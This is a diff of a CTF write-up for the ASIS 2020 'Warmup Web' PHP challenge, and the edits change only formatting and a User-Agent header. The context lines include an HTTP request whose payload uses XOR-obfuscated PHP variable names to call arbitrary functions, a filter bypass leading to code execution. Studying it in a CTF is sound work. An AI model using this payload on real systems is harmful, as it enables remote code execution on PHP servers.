@@ -1,7 +1,7 @@
 ## ASIS 2020 CTF - Warmup Web - Writeup
 
 ## Vulnerable code
-```
+```php
 <?php
 
 ini_set('display_errors', 1);
@@ -34,7 +34,7 @@ if(isset($_GET['warmup'])){
 POST /?warmup=$_='%23./|{'^'|~`//|';${$_}[0](${$_}[1]); HTTP/1.1
 Host: 69.90.132.196:5003
 Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+User-Agent: X
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
